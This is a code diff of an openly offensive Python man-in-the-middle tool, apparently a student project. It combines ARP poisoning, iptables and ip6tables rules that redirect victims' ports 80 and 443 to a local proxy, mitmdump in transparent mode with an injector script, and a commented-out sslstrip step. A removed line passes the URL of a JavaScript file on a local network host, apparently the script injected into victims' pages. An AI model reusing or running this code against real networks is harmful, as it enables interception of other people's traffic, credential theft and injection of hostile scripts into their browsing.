@@ -4,6 +4,7 @@ import os, sys, argparse
 import threading
 from httpServer import webserver
 from ArpSpoof import arp_poison_attack
+from mitmproxy.tools.main import mitmdump
 
 def main():
 
@@ -17,6 +18,8 @@ def main():
 	os.system("iptables -t nat -A POSTROUTING -o"+args.interface+" -j MASQUERADE")
 	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
 	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
+	os.system("ip6tables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+	os.system("ip6tables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
 
 	#Starting ARP Attack
 	#arp_poison_attack(args.interface, args.file)
@@ -36,11 +39,12 @@ def main():
 	# start the mitmproxy
 
 
-	mitmdump(['-s', '/root/Documents/ESGI/BadSquirrel/injector.py', 'http://192.168.1.10:8000/script.js ', '--mode', 'transparent'])
+	mitmdump(['-s', 'injector.py', '--showhost', '--mode', 'transparent', '--showhost'])
 	webserver_thread.join()
 	poison_thread.join()
 	webserver_thread._stop()
 	poison_thread._stop()
+	
 	'''
 	# run sslstrip
 	os.system("xterm -e sslstrip -l 8080 &")
